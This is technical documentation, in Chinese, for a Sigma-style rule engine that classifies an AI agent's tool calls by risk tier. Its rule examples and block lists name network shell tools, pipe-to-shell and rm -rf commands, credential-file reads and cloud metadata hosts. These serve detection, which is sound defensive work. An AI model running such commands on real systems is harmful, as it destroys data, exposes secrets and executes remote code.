# SecLaw Sigma-Style Rule Engine 技术文档

## 目录

1. [概述](#1-概述)
2. [核心概念](#2-核心概念)
3. [规则文件格式](#3-规则文件格式)
4. [Detection 语法详解](#4-detection-语法详解)
5. [字段系统](#5-字段系统)
6. [Lists 与 Macros](#6-lists-与-macros)
7. [引擎架构](#7-引擎架构)
8. [跨平台支持](#8-跨平台支持)
9. [规则编写指南](#9-规则编写指南)
10. [扩展机制](#10-扩展机制)
11. [完整示例](#11-完整示例)
12. [API 参考](#12-api-参考)
13. [调试与测试](#13-调试与测试)

---

## 1. 概述

SecLaw 规则引擎采用 **Sigma 风格** 的检测语法,对 AI Agent 的每一个工具调用进行实时安全分类。

### 1.1 设计原则

- **引擎只做字段提取和模式匹配,安全判断全部放在规则中**
- `tool` 是一级路由字段(OpenClaw 工具名),`command` 仅指 exec 工具内的 shell 命令内容
- 计算字段仅保留"原始分解"和"RFC 级别事实",不编码安全判断
- 支持 AND/OR/NOT 布尔组合、字段修饰符、列表引用
- 跨平台: macOS + Linux + Windows

### 1.2 三层分类

| 层级 | 含义 | 审计策略 |
|------|------|----------|
| **GREEN** | 已知安全操作 | 立即放行,不做任何审计 |
| **YELLOW** | 需要后台审查 | 立即放行,后台异步 LLM 审计 |
| **RED** | 需要实时审查 | 阻塞执行,同步 LLM 审计后决定放行/拦截 |

无匹配规则时默认为 **YELLOW**。

### 1.3 分类流程

```
工具调用到达
  ↓
构建 MatchContext (分解 command/path/url)
  ↓
RuleIndex.getCandidates(toolName, platform) → 候选规则
  ↓
按 priority 降序逐一匹配: rule.matcher(ctx)
  ↓
首条匹配胜出 → { tier, ruleId, reason }
  ↓
无匹配 → { tier: "YELLOW" }
```

---

## 2. 核心概念

### 2.1 Tool vs Command

```
OpenClaw Tool Call:
  toolName = "exec"                          ← 这是 tool
  params = { command: "rm -rf /tmp/build" }  ← 这是 command (exec 专属)

OpenClaw Tool Call:
  toolName = "write"
  params = { path: "/etc/hosts", content: "..." }

OpenClaw Tool Call:
  toolName = "web_fetch"
  params = { url: "http://169.254.169.254/..." }
```

`tool` 字段直接引用 OpenClaw 工具名:

| 工具名 | 用途 |
|--------|------|
| `exec` / `bash` | 执行 shell 命令 |
| `read` / `fs_read` | 读取文件 |
| `write` / `edit` / `apply_patch` / `fs_write` | 写入/编辑文件 |
| `fs_delete` / `fs_move` | 删除/移动文件 |
| `web_fetch` | HTTP 请求 |
| `web_search` | 搜索引擎查询 |
| `sessions_spawn` / `sessions_send` | 会话管理 |
| `gateway` | 网关操作 |
| `memory_read` / `memory_write` / `memory_list` / `memory_delete` | 内存操作 |

### 2.2 优先级体系

| 范围 | 层级 | 说明 |
|------|------|------|
| 9000-10000 | RED | 灾难性模式 (rm -rf /, pipe-to-shell, 凭证窃取) |
| 8000-8500 | RED | 始终 RED 的工具 (fs_delete, sessions_spawn), 提权执行 |
| 7000-7500 | GREEN/YELLOW | 已知安全模式 (git → GREEN, workspace rm → YELLOW) |
| 6000-6500 | RED | 参数级 RED (危险命令, 敏感文件, SSRF) |
| 5000-5500 | GREEN | 始终 GREEN 的工具 (read, web_search, memory_*) |
| 4000-4500 | YELLOW | 参数级 YELLOW (兜底规则) |

**关键设计**: GREEN 安全模式 (7000+) 覆盖参数级 RED (6000+),确保 `git status` 和 `npm install` 不会被过度分类。灾难性 RED (9000+) 始终优先。

---

## 3. 规则文件格式

### 3.1 完整结构

```yaml
# 列表定义 (可选)
lists:
  dangerous_cmds: [mkfs, dd, nc, ncat, netcat, eval]
  safe_cmds: [git, npm, yarn, pnpm, bun, pip, pip3, poetry, cargo, go]
  cloud_metadata_hosts:
    - "169.254.169.254"
    - "metadata.google.internal"

# 规则列表
rules:
  - id: CAT-RM-SYSTEM                 # 唯一标识符
    name: Recursive delete system dirs  # 人类可读名称
    tool: [exec, bash]                  # 适用的 OpenClaw 工具
    platform: [linux, macos]            # 可选: 平台过滤
    tier: RED                           # 分类结果: GREEN / YELLOW / RED
    priority: 10000                     # 评估优先级 (降序)
    reason: "Recursive delete"          # 传递给 LLM 审计的上下文
    tags: [destructive, data_loss]      # 可选: 语义标签
    detection:                          # Sigma 风格检测块
      selection:
        command|re: "rm\\s+.*(-rf|-fr)\\s+(/\\s|/$)"
      condition: selection
```

### 3.2 字段说明

| 字段 | 必填 | 类型 | 说明 |
|------|------|------|------|
| `id` | 是 | string | 唯一规则 ID,如 `CAT-001`, `SAFE-GIT` |
| `name` | 是 | string | 人类可读的规则名称 |
| `tool` | 是 | string[] | 匹配的工具名列表,支持 `["*"]` 通配 |
| `tier` | 是 | `GREEN` \| `YELLOW` \| `RED` | 分类结果 |
| `priority` | 是 | number | 优先级,数字越大越先匹配 |
| `detection` | 是 | object | 检测块,包含命名选择器 + condition 表达式 |
| `platform` | 否 | string[] | 平台过滤: `linux`, `macos`, `windows` |
| `reason` | 否 | string | 规则触发原因,传递给 LLM 审计提示词 |
| `tags` | 否 | string[] | 语义标签,用于分类和报告 |

### 3.3 多文件加载

规则引擎同时加载多个 YAML 文件并合并:

```
rules/
  default.yaml      ← 跨平台共享规则 (URL、文件写入、工具级规则)
  unix.yaml          ← Linux/macOS 专用规则 (shell 命令)
  windows.yaml       ← Windows 专用规则 (cmd.exe, PowerShell)
```

加载逻辑:
1. 加载 **active rule file** (默认 `default.yaml`)
2. 自动加载 **平台规则文件** — Linux/macOS 加载 `unix.yaml`, Windows 加载 `windows.yaml`
3. 所有列表 (lists) 合并为全局命名空间
4. 所有规则合并后编译

---

## 4. Detection 语法详解

### 4.1 Selection (选择器)

一个 selection 是一组字段匹配条件。**同一 selection 内的多个字段为 AND 关系**。

```yaml
detection:
  # 单字段选择器
  selection:
    command|re: "rm\\s+-rf"
  condition: selection

  # 多字段选择器 (AND)
  sel_rm_outside_workspace:
    command|startswith: "rm"
    file.inWorkspace: false
  condition: sel_rm_outside_workspace

  # 空选择器 = 无条件匹配
  any: {}
  condition: any
```

### 4.2 字段修饰符

修饰符通过 `|` 附加在字段名后:

| 修饰符 | 含义 | 示例 |
|--------|------|------|
| (无) | 精确匹配;多值时为 OR | `cmd.primary: [npm, yarn]` |
| `\|re` | 正则匹配 | `command\|re: "rm\\s+.*-rf"` |
| `\|contains` | 子串包含 | `path\|contains: ".ssh"` |
| `\|startswith` | 前缀匹配 | `command\|startswith: "git"` |
| `\|endswith` | 后缀匹配 | `path\|endswith: ".pem"` |
| `\|all` | 所有值都必须匹配 (AND) | `tags\|all: [admin, write]` |

### 4.3 正则表达式

支持标准 JavaScript 正则语法,额外支持 `(?i)` 前缀表示大小写不敏感:

```yaml
# 大小写不敏感
path|re: "(?i)(\\.ssh[/\\\\]|authorized_keys)"

# 标准正则
command|re: "rm\\s+.*(-rf|-fr)\\s+/"
```

> **注意**: YAML 中的反斜杠需要双重转义 — `\\s` 在 YAML 中表示正则的 `\s`。

### 4.4 多值语义

**值列表 → OR 关系** (任一值匹配即为真):

```yaml
# 精确匹配任一值
cmd.primary:
  - npm
  - yarn
  - pnpm

# 等价写法
cmd.primary: [npm, yarn, pnpm]
```

### 4.5 数组字段匹配

当字段值是数组 (如 `cmd.all`),匹配语义为 **任一元素匹配即为真**:

```yaml
# cmd.all = ["echo", "rm", "ls"]
cmd.all: "rm"                      # ✓ — "rm" 在数组中
cmd.all: [mkfs, dd, nc]            # ✓ — 如果任一元素在列表中
cmd.all|re: "^(mkfs|wipefs)(\\.|$)" # ✓ — 如果任一元素匹配正则
cmd.all|contains: "mk"             # ✓ — 如果任一元素包含 "mk"
```

### 4.6 Condition 表达式

condition 使用布尔逻辑组合多个 selection:

```yaml
# 单个 selection
condition: selection

# AND
condition: sel1 and sel2

# OR
condition: sel1 or sel2

# NOT
condition: sel1 and not filter

# 括号
condition: (sel1 or sel2) and not filter

# 通配量词
condition: 1 of sel_*     # 任一 sel_xxx 匹配
condition: all of sel_*    # 所有 sel_xxx 匹配
```

**运算符优先级**: `not` > `and` > `or`

### 4.7 复合检测示例

```yaml
# 磁盘格式化/擦除: mkfs OR wipefs OR shred OR dd of=/dev/*
detection:
  format:
    cmd.all|re: "^(mkfs|wipefs|shred)(\\.|$)"
  dd_dev:
    command|re: "dd\\s+.*of=/dev/"
  condition: format or dd_dev

# 敏感文件读取: cat + 敏感关键词 OR grep + 密码关键词 OR 访问 .ssh/
detection:
  cat_sensitive:
    command|re: "\\bcat\\b.*(secret|credential|id_rsa)"
  grep_secrets:
    command|re: "\\bgrep\\b.*(password|token|api.?key)"
  ssh_access:
    command|re: "\\.ssh/"
  condition: 1 of cat_sensitive or grep_secrets or ssh_access

# 外部 URL (非私有 IP)
detection:
  any: {}
  private:
    url.isPrivateIP: true
  condition: any and not private
```

---

## 5. 字段系统

### 5.1 设计原则

> **引擎提供原始分解,规则表达安全判断。**

- 计算字段 = 对原始参数的**结构分解** (拆分、解析、提取)
- 计算字段 **不编码** 任何安全判断
- 仅两个例外: `url.isPrivateIP` (RFC 1918 标准事实) 和 `file.inWorkspace` (运行时动态计算)

### 5.2 原始参数字段

直接从 `params` 取值,零计算:

| 字段 | 适用工具 | 说明 |
|------|----------|------|
| `command` | exec, bash | shell 命令字符串 |
| `path` | read, write, edit, apply_patch, fs_write | 文件路径 |
| `url` | web_fetch | URL 字符串 |
| `action` | process, browser | 操作类型 |
| `host` | exec | 执行位置 (sandbox/gateway/node) |
| `elevated` | exec | 是否请求提权 (boolean) |
| `content` | write | 写入内容 |
| `query` | web_search | 搜索查询 |

通用访问: 任何参数可通过 `param.<key>` 访问 (如 `param.sessionId`)。

### 5.3 命令分解字段 (`cmd.*`)

**仅当 tool = exec/bash 时有值**。由 `splitCommandChain()` + `extractPrimaryCommand()` 计算。

| 字段 | 类型 | 说明 | 示例输入 → 输出 |
|------|------|------|-----------------|
| `cmd.primary` | string \| null | 首段首个命令名 | `"env rm -rf /"` → `"rm"` |
| `cmd.all` | string[] | 全链所有命令名 | `"echo ok && rm -rf /"` → `["echo", "rm"]` |
| `cmd.segments` | string[] | 全链原始段 | `"echo ok && rm -rf /"` → `["echo ok", "rm -rf /"]` |

**命令链分割规则**:

| 平台 | 分割操作符 |
|------|-----------|
| linux/macos | `\|`, `&&`, `\|\|`, `;` |
| windows | `\|`, `&&`, `\|\|`, `&` (单 `&` = cmd.exe 顺序执行), `;` (PowerShell) |

分割时尊重引号 (单引号、双引号) 和反斜杠转义。

**安全包装器跳过**: `extractPrimaryCommand()` 会跳过 `nohup`, `env`, `nice`, `ionice`, `time`, `strace`,但**不跳过** `sudo`, `su` (安全相关)。

```yaml
# 示例: "NODE_ENV=production env nohup npm start"
# cmd.primary = "npm" (跳过 env var 前缀和 env/nohup 包装器)
```

### 5.4 文件路径分解字段 (`file.*`)

**当工具有 `path` 参数时有值**:

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| `file.dir` | string | 目录部分 | `"/home/user/.ssh"` |
| `file.name` | string | 文件名 (含扩展名) | `"id_rsa"` |
| `file.ext` | string | 扩展名 (含点号) | `".ts"` 或 `""` |
| `file.inWorkspace` | boolean | 路径是否在工作区内 | `true` / `false` |

对于 exec 工具,如果命令中包含文件路径,也会提取并计算 `file.inWorkspace`。

### 5.5 URL 分解字段 (`url.*`)

**当工具有 `url` 参数时有值**:

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| `url.host` | string | 主机名 | `"169.254.169.254"` |
| `url.port` | number \| null | 端口号 | `8080` |
| `url.path` | string | 路径部分 | `"/latest/meta-data/iam"` |
| `url.scheme` | string | 协议 | `"https"` |
| `url.isPrivateIP` | boolean | 是否为 RFC 1918 私有/回环/链路本地地址 | `true` |

`url.isPrivateIP` 检测范围:
- RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- 回环: `127.0.0.0/8`, `::1`
- 链路本地: `169.254.0.0/16`
- 特殊: `0.0.0.0`
- 十六进制编码: `0x7f000001` (= 127.0.0.1)
- 八进制编码: `0177.0.0.1` (= 127.0.0.1)
- 主机名: `localhost`, `localhost.localdomain`

### 5.6 扩展字段 (`ext.*`)

预留给未来功能 (如脚本首次执行检测):

```yaml
# 未来规则示例
detection:
  selection:
    ext.isFirstExecution: true
  condition: selection
```

注册方式:
```typescript
engine.getFieldRegistry().register("ext.scriptHash", (ctx) => ctx.ext.scriptHash);
```

---

## 6. Lists 与 Macros

### 6.1 Lists

在 YAML 文件顶层定义命名列表,在规则中通过 `$list:name` 引用:

```yaml
lists:
  dangerous_cmds: [mkfs, dd, nc, ncat, netcat, eval]
  safe_cmds: [git, npm, yarn, pnpm, bun]
  cloud_metadata_hosts:
    - "169.254.169.254"
    - "metadata.google.internal"
    - "100.100.100.200"
```

**引用方式**:

```yaml
rules:
  # 在 tool 字段中引用 (展开为工具名列表)
  - id: TOOL-GREEN-READ
    tool: $list:safe_read_tools
    detection:
      any: {}
      condition: any

  # 在 detection 值位置引用 (展开为 OR 列表)
  - id: CMD-DANGEROUS
    detection:
      selection:
        cmd.all: $list:dangerous_cmds
      condition: selection

  # 在精确匹配中引用
  - id: URL-METADATA
    detection:
      selection:
        url.host: $list:cloud_metadata_hosts
      condition: selection
```

**列表作用域**: 同一 YAML 文件内定义的列表可在该文件的规则中使用。多文件加载时,所有列表合并为全局命名空间。

### 6.2 Macros (预留)

Macros 用于封装可复用的检测片段:

```yaml
macros:
  pipe_to_shell:
    detection:
      _sel:
        command|re: "\\|\\s*(sh|bash|zsh|dash|ksh|csh|fish|source|eval)\\b"
      _condition: _sel
```

> **注意**: 当前版本解析 macros 但尚未实现注入到规则的逻辑。这是一个预留的扩展点。

---

## 7. 引擎架构

### 7.1 编译管道

```
YAML 文件
  ↓ RuleResolver (src/rule-resolver.ts)
  ↓   ├ 解析 lists: 段 → Map<string, string[]>
  ↓   ├ 展开 $list:name 引用 (tool 数组中)
  ↓   └ 标准化 SigmaRule[]
  ↓
SigmaRule[]
  ↓ DetectionCompiler (src/detection-compiler.ts)
  ↓   ├ 解析 selection 的 field|modifier → 匹配函数
  ↓   ├ 解析 condition 表达式 → 布尔组合器
  ↓   └ 预编译正则 (处理 (?i) 前缀)
  ↓
CompiledRule[]
  ↓ RuleIndex (src/rule-index.ts)
  ↓   ├ 按 tool 索引 (Map<string, CompiledRule[]>)
  ↓   ├ 通配规则 (tool: ["*"]) 单独存储
  ↓   └ 每组按 priority 降序排列
  ↓
Ready for classify()
```

### 7.2 classify() 流程

```typescript
classify(toolName, params, intentContext, workspacePath)
  │
  ① 构建 MatchContext:
  │   - 设置 tool, params, platform, workspacePath
  │   - 提取 command/path/url 等原始参数快捷字段
  │   - 惰性计算 cmd.* (仅 exec 时)
  │   - 惰性计算 file.* (仅有 path 时)
  │   - 惰性计算 url.* (仅有 url 时)
  │
  ② RuleIndex.getCandidates(toolName, platform):
  │   - 获取 tool 匹配的规则 + 通配规则
  │   - 归并排序 (两个已排序数组)
  │   - 按 platform 过滤
  │
  ③ 逐一调用 rule.matcher(ctx):
  │   - 首条匹配 → 返回 { tier, ruleId, reason }
  │
  ④ 无匹配 → { tier: "YELLOW" }
```

### 7.3 模块关系图

```
index.ts (插件入口)
  │
  ├─ RuleEngine (src/rule-engine.ts)
  │   ├─ RuleResolver    ← 加载/解析 YAML
  │   ├─ DetectionCompiler ← 编译检测块
  │   ├─ RuleIndex        ← 工具/平台索引
  │   ├─ FieldRegistry    ← 字段解析
  │   └─ patterns/        ← 命令/路径/URL 分解
  │       ├─ command-patterns.ts
  │       ├─ path-patterns.ts
  │       └─ url-patterns.ts
  │
  ├─ LLMAuditor (RED 触发时)
  ├─ AsyncAuditQueue (YELLOW 的后台审计)
  └─ AuditLog (日志)
```

---

## 8. 跨平台支持

### 8.1 平台检测

```typescript
function detectPlatform(): Platform {
  const p = os.platform();
  if (p === "darwin") return "macos";
  if (p === "win32") return "windows";
  return "linux";
}
```

### 8.2 平台规则过滤

规则可指定 `platform` 字段限制适用平台:

```yaml
# 仅 Linux/macOS
- id: CAT-SYSTEMD
  platform: [linux]          # 仅 Linux (systemd)

# 仅 Windows
- id: CAT-WIN-REGISTRY
  platform: [windows]

# 跨平台 (省略 platform 字段)
- id: URL-SSRF-PRIVATE
  tool: [web_fetch]
  # 无 platform → 所有平台生效
```

### 8.3 命令链分割差异

| 特性 | Linux/macOS | Windows |
|------|-------------|---------|
| 管道 `\|` | 分割 | 分割 |
| 逻辑与 `&&` | 分割 | 分割 |
| 逻辑或 `\|\|` | 分割 | 分割 |
| 分号 `;` | 分割 | 分割 (PowerShell) |
| 单个 `&` | **不分割** (后台运行) | **分割** (cmd.exe 顺序执行) |

### 8.4 规则文件组织

| 文件 | 平台 | 内容 |
|------|------|------|
| `default.yaml` | 所有 | 工具级规则, URL 安全, 文件写入安全 |
| `unix.yaml` | linux, macos | shell 命令模式, 系统管理命令 |
| `windows.yaml` | windows | cmd.exe, PowerShell, 注册表, 服务 |

---

## 9. 规则编写指南

### 9.1 规则 ID 命名约定

| 前缀 | 含义 | 优先级范围 |
|------|------|-----------|
| `CAT-*` | 灾难性模式 | 9000-10000 |
| `TOOL-RED-*` | 始终 RED 的工具 | 8000 |
| `EXEC-*` | exec 工具特定规则 | 8500 |
| `SAFE-*` | 已知安全模式 | 7000-7500 |
| `CMD-*` | 命令级检测 | 6400-6500 |
| `URL-*` | URL 安全检测 | 6100-6200 |
| `WRITE-*` | 文件写入安全 | 6300-9200 |
| `TOOL-GREEN-*` | 始终 GREEN 的工具 | 5500 |

### 9.2 常见模式

**工具级规则 (无条件匹配)**:
```yaml
- id: TOOL-RED-DELETE
  name: File deletion
  tool: [fs_delete]
  tier: RED
  priority: 8000
  detection:
    any: {}
    condition: any
```

**命令正则匹配**:
```yaml
- id: CAT-RM-SYSTEM
  name: Recursive delete system dirs
  tool: [exec, bash]
  platform: [linux, macos]
  tier: RED
  priority: 10000
  detection:
    selection:
      command|re: "rm\\s+.*(-rf|-fr)\\s+(/\\s|/$|~/?$|/etc\\b)"
    condition: selection
```

**命令链中的危险命令**:
```yaml
- id: CMD-DANGEROUS
  name: Dangerous command in chain
  tool: [exec, bash]
  tier: RED
  priority: 6500
  detection:
    selection:
      cmd.all: $list:dangerous_cmds      # 检查链中所有命令
    condition: selection
```

**安全命令 + 安全操作 (AND)**:
```yaml
- id: SAFE-PKG
  name: Package manager
  tool: [exec, bash]
  tier: GREEN
  priority: 7200
  detection:
    pkg:
      cmd.primary: $list:safe_cmds       # 首个命令在安全列表中
    action:
      command|re: "\\s+(install|build|test|run|start)\\b"  # 且操作是安全的
    condition: pkg and action             # 两者都满足
```

**排除模式 (NOT)**:
```yaml
- id: URL-EXTERNAL-SAFE
  name: External URL fetch
  tool: [web_fetch]
  tier: YELLOW
  priority: 4000
  detection:
    any: {}
    private:
      url.isPrivateIP: true
    condition: any and not private        # 不是私有 IP
```

**工作区范围限定**:
```yaml
- id: SAFE-WORKSPACE-RM
  name: Workspace-scoped delete
  tool: [exec, bash]
  tier: YELLOW
  priority: 7500
  detection:
    rm:
      command|startswith: "rm"            # rm 命令
    in_ws:
      file.inWorkspace: true             # 目标在工作区内
    condition: rm and in_ws              # 两者都满足
```

**带点号后缀的命令名** (如 `mkfs.ext4`):
```yaml
- id: CAT-DISK-FORMAT
  detection:
    format:
      cmd.all|re: "^(mkfs|wipefs|shred)(\\.|$)"  # mkfs 或 mkfs.ext4
    condition: format
```

**多条件 OR**:
```yaml
- id: CAT-CRON
  detection:
    cron:
      command|re: "crontab\\s+-[^l]"     # crontab (非只读 -l)
    at:
      command|re: "\\bat\\s+"            # at 命令
    condition: cron or at                 # 任一匹配
```

### 9.3 注意事项

1. **YAML 转义**: 正则中的 `\` 需要写为 `\\`,如 `\s` → `\\s`,`\b` → `\\b`
2. **优先级冲突**: 确保高优先级的安全规则 (如 SAFE-GIT at 7200) 不会被低优先级的危险规则 (如 CMD-DANGEROUS at 6500) 覆盖 — 高优先级先匹配
3. **空 detection**: 使用 `any: {}` + `condition: any` 实现无条件匹配
4. **平台字段**: 省略 `platform` 表示所有平台生效
5. **`(?i)` 前缀**: 用于大小写不敏感的正则,如 `(?i)\\.ssh`

---

## 10. 扩展机制

### 10.1 自定义字段

通过 `FieldRegistry.register()` 添加自定义字段:

```typescript
const engine = new RuleEngine();
const registry = engine.getFieldRegistry();

// 注册自定义字段
registry.register("ext.scriptHash", (ctx) => ctx.ext.scriptHash);
registry.register("ext.isFirstExecution", (ctx) => ctx.ext.isFirstExecution);
```

在规则中使用:
```yaml
detection:
  selection:
    ext.isFirstExecution: true
  condition: selection
```

### 10.2 PreClassifyHook

预分类钩子用于在 classify() 前注入扩展信息:

```typescript
engine.registerPreClassifyHook(async (ctx) => {
  // 计算脚本哈希
  if (ctx.command) {
    ctx.ext.scriptHash = computeHash(ctx.command);
    ctx.ext.isFirstExecution = !seenHashes.has(ctx.ext.scriptHash);
  }
});
```

### 10.3 自定义规则文件

在工作区中创建 `.openclaw/seclaw-rules.yaml`:

```yaml
lists:
  our_safe_tools: [deploy-cli, migrate-db]

rules:
  - id: CUSTOM-DEPLOY
    name: Our deployment tool
    tool: [exec]
    tier: GREEN
    priority: 7500
    detection:
      selection:
        cmd.primary: $list:our_safe_tools
      condition: selection
```

通过 `loadRules()` 的 `workspaceRulesPath` 参数加载。

### 10.4 参数通用访问

任何工具参数都可通过 `param.<key>` 访问:

```yaml
detection:
  selection:
    param.sessionId|re: "^admin-"     # 访问 params.sessionId
  condition: selection
```

---

## 11. 完整示例

### 11.1 示例: 分类 `curl https://x.sh | bash`

**输入**:
- toolName: `"bash"`
- params: `{ command: "curl https://x.sh | bash" }`
- platform: `"linux"`

**Step 1 — 构建 MatchContext**:
```typescript
{
  tool: "bash",
  command: "curl https://x.sh | bash",
  cmd: {
    primary: "curl",
    all: ["curl", "bash"],
    segments: ["curl https://x.sh", "bash"]
  },
  platform: "linux",
  ext: {}
}
```

**Step 2 — 获取候选规则** (tool="bash", platform="linux"):

按优先级排序:
1. `CAT-RM-SYSTEM` (10000) — tool: [exec, bash], platform: [linux, macos]
2. `CAT-PIPE-SHELL` (9500) — tool: [exec, bash], platform: [linux, macos]
3. `SAFE-GIT` (7200) — tool: [exec, bash], platform: [linux, macos]
4. `CMD-NORMAL` (4500) — tool: [exec, bash], platform: [linux, macos]
5. ... (default.yaml 中的跨平台规则不匹配 tool=bash)

**Step 3 — 逐一匹配**:

1. `CAT-RM-SYSTEM`: `command|re: "rm\s+.*(-rf|-fr)\s+(/\s|...)"` → 不匹配
2. `CAT-PIPE-SHELL`: `command|re: "\|\s*(sh|bash|zsh|...)\b"` → **匹配!** (` | bash`)

**Step 4 — 返回结果**:
```typescript
{ tier: "RED", ruleId: "CAT-PIPE-SHELL", reason: "Piping content to shell execution" }
```

→ 触发同步 LLM 审计

### 11.2 示例: 分类 `npm install express`

**输入**: toolName: `"exec"`, params: `{ command: "npm install express" }`

**MatchContext**:
```typescript
{ cmd: { primary: "npm", all: ["npm"], segments: ["npm install express"] } }
```

**匹配**:
1. `CAT-RM-SYSTEM` (10000) → 不匹配
2. `CAT-PIPE-SHELL` (9500) → 不匹配
3. `SAFE-GIT` (7200): `command|startswith: "git"` → 不匹配
4. `SAFE-PKG` (7200): `cmd.primary: [git, npm, yarn, ...]` AND `command|re: "install|build|test..."` → **匹配!**

**结果**: `{ tier: "GREEN", ruleId: "SAFE-PKG" }` → 立即放行,零审计

### 11.3 示例: 分类 `fs_write` 到 `.ssh/authorized_keys`

**输入**: toolName: `"fs_write"`, params: `{ path: "/home/user/.ssh/authorized_keys" }`

**MatchContext**:
```typescript
{
  tool: "fs_write",
  path: "/home/user/.ssh/authorized_keys",
  file: { dir: "/home/user/.ssh", name: "authorized_keys", ext: "", inWorkspace: false }
}
```

**匹配** (仅 tool=fs_write 的候选):
1. `WRITE-SENSITIVE-SSH` (9200): `path|re: "(?i)(\.ssh[/\\]|authorized_keys|...)"` → **匹配!**

**结果**: `{ tier: "RED", ruleId: "WRITE-SENSITIVE-SSH", reason: "Modifying SSH configuration files" }`

---

## 12. API 参考

### 12.1 RuleEngine

```typescript
class RuleEngine {
  constructor(platform?: Platform);

  // 从 YAML 文件加载规则
  loadRules(options: {
    defaultRulesPath?: string;      // 主规则文件路径
    workspaceRulesPath?: string;    // 工作区规则文件路径
    extraRulePaths?: string[];      // 额外规则文件路径列表
    extraRules?: SigmaRule[];       // 内联规则
  }): void;

  // 直接设置规则 (测试用)
  setRules(rules: SigmaRule[], lists?: Map<string, string[]>): void;

  // 分类工具调用
  classify(
    toolName: string,
    params: Record<string, unknown>,
    intentContext: IntentContext,
    workspacePath?: string,
  ): RuleResult;

  // 获取已加载规则 (调试/API)
  getRules(): readonly CompiledRule[];

  // 获取字段注册表 (扩展用)
  getFieldRegistry(): FieldRegistry;

  // 平台管理
  getPlatform(): Platform;
  setPlatform(platform: Platform): void;

  // 注册预分类钩子
  registerPreClassifyHook(hook: PreClassifyHook): void;
}
```

### 12.2 RuleResult

```typescript
interface RuleResult {
  tier: "GREEN" | "YELLOW" | "RED";
  ruleId?: string;    // 匹配的规则 ID
  reason?: string;    // 规则原因
}
```

### 12.3 FieldRegistry

```typescript
class FieldRegistry {
  register(fieldPath: string, resolver: (ctx: MatchContext) => unknown): void;
  resolve(fieldPath: string, ctx: MatchContext): unknown;
}
```

---

## 13. 调试与测试

### 13.1 在测试中使用

```typescript
import { RuleEngine } from "../src/rule-engine.js";
import type { SigmaRule, IntentContext } from "../src/config.js";

const intent: IntentContext = {
  userGoal: "Build a web app",
  stepIndex: 0,
  turnNumber: 1,
  recentToolCalls: [],
};

// 创建引擎并设置规则
const engine = new RuleEngine("linux");
engine.setRules([
  {
    id: "TEST-001",
    name: "Test rule",
    tool: ["exec"],
    tier: "RED",
    priority: 9000,
    detection: {
      selection: { "command|re": "rm\\s+-rf" },
      condition: "selection",
    },
  },
]);

// 测试分类
const result = engine.classify("exec", { command: "rm -rf /" }, intent);
expect(result.tier).toBe("RED");
expect(result.ruleId).toBe("TEST-001");
```

### 13.2 从 YAML 文件加载

```typescript
const engine = new RuleEngine("linux");
engine.loadRules({
  defaultRulesPath: "rules/default.yaml",
  extraRulePaths: ["rules/unix.yaml"],
});

const result = engine.classify("exec", { command: "git status" }, intent);
// → { tier: "GREEN", ruleId: "SAFE-GIT" }
```

### 13.3 调试技巧

```typescript
// 查看已加载规则数量
console.log("Rules loaded:", engine.getRules().length);

// 查看某个工具的候选规则
const rules = engine.getRules().filter(r => r.tool.includes("exec"));
console.log("Exec rules:", rules.map(r => `${r.id} (${r.priority})`));

// 检查平台
console.log("Platform:", engine.getPlatform());

// 切换平台 (测试用)
engine.setPlatform("windows");
```

### 13.4 运行测试

```bash
# 运行所有测试
npm test

# 运行特定测试文件
npx vitest run tests/rule-engine.test.ts

# 运行特定测试用例
npx vitest run -t "RED for rm -rf"

# 监视模式
npm run test:watch
```
